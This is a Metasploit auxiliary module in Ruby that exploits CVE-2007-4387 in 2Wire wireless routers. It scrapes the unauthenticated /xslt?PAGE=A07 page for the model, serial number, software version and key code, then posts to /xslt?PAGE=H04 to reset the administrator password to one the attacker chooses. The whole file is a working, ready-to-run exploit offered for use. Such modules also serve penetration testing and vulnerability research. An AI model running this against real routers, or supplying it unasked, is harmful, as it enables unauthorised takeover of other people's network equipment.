##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "2Wire Cross-Site Request Forgery Password Reset Vulnerability",
      'Description'    => %q{
          This module will reset the admin password on a 2Wire wireless router.  This is
        done by using the /xslt page where authentication is not required, thus allowing
        configuration changes (such as resetting the password) as administrators.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'hkm [at] hakim.ws',              #Initial discovery, poc
          'Travis Phillips',  #Msf module
        ],
      'References'     =>
        [
          [ 'CVE', '2007-4387' ],
          [ 'OSVDB', '37667' ],
          [ 'BID', '36075' ],
          [ 'URL', 'http://seclists.org/bugtraq/2007/Aug/225' ],
        ],
      'DisclosureDate' => "Aug 15 2007" ))

      register_options(
        [
          OptString.new('PASSWORD', [ true, 'The password to reset to', 'admin'])
        ], self.class)
  end

  def run

    print_status("Attempting to connect to http://#{rhost}/xslt?PAGE=A07 to gather information")
    res = send_request_raw(
    {
      'method'  => 'GET',
      'uri'     => '/xslt?PAGE=A07',
    }, 25)

    if not res
      print_error("No response from server")
      return
    end

    #check to see if we get HTTP OK
    if (res.code == 200)
      print_status("Okay, Got an HTTP 200 (okay) code. Verifying Server header")
    else
      print_error("Did not get HTTP 200, URL was not found. Exiting!")
      return
    end

    #Check to verify server reported is a 2wire router
    if (res.headers['Server'].match(/2wire Gateway/i))
      print_status("Server is a 2wire Gateway! Grabbing info\n")
    else
      print_error("Target doesn't seem to be a 2wire router. Exiting!")
      return
    end

    print_status("---===[ Router Information ]===---")

    # Grabbing the Model Number
    if res.body.match(/<td class="textmono">(.*)<\/td>/i)
      model = $1
      print_status("Model: #{model}")
    end

    # Grabbing the serial Number
    if res.body.match(/<td class="data">(\d{12})<\/td>/i)
      serial = $1
      print_status("Serial: #{serial}")
    end

    # Grabbing the Hardware Version
    if res.body.match(/<td class="data">(\d{4}-\d{6}-\d{3})<\/td>/i)
      hardware = $1
      print_status("Hardware Version: #{hardware}")
    end

    #Check the Software Version
    if res.body.match(/<td class="data">(5\.\d{1,3}\.\d{1,3}\.\d{1,3})<\/td>/i)
      ver = $1
      print_status("Software version: #{ver}")
    else
      print_error("Target is not a version 5 router. Exiting!")
      return
    end

    # Grabbing the Key Code
    if res.body.match(/<td class="data">(\w{4}-\w{4}-\w{4}-\w{4}-\w{4})<\/td>/i)
      key = $1
      print_status("Key Code: #{key}\n")
    end

    print_status("Attempting to exploit Password Reset Vulnerability on #{rhost}")
    print_status("Connecting to http://#{rhost}/xslt?PAGE=H04 to make sure page exist.")

    res = send_request_raw(
    {
      'method'  => 'GET',
      'uri'     => '/xslt?PAGE=H04',
    }, 25)

    if ( res and res.code == 200 and res.body.match(/<title>System Setup - Password<\/title>/i))
      print_status("Found password reset page. Attempting to reset admin password to #{datastore['PASSWORD']}")

      data  = 'PAGE=H04_POST'
      data << '&THISPAGE=H04'
      data << '&NEXTPAGE=A01'
      data << '&PASSWORD=' + datastore['PASSWORD']
      data << '&PASSWORD_CONF=' + datastore['PASSWORD']
      data << '&HINT='

      res = send_request_cgi(
      {
        'method'  => 'POST',
        'uri'     => '/xslt',
        'data'    => data,
      }, 25)

      if res and res.code == 200
        if (res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/(.*); path=\//))
          cookie= $1
          print_status("Got cookie #{cookie}. Password reset was successful!\n")
        end
      end
    end

  end

end
